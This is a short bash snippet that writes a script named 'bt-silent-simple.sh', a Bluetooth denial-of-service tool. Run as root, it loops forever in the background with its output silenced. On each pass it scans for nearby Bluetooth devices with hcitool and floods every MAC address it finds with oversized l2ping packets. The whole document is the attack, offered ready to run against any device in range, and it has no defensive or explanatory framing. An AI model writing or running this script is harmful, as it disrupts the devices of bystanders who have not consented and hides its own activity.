cat > bt-silent-simple.sh << 'EOF'
#!/bin/bash
[[ $EUID -ne 0 ]] && { echo "Use sudo"; exit 1; }
pkill l2ping 2>/dev/null
echo "[*] Running - silent mode"

(while true; do
  hcitool scan 2>/dev/null | awk "NR>1 {print \$1}" | while read MAC; do
    l2ping -i hci0 -s 600 -f "$MAC" >/dev/null 2>&1 &
  done
  sleep 10
done) >/dev/null 2>&1 & disown
EOF
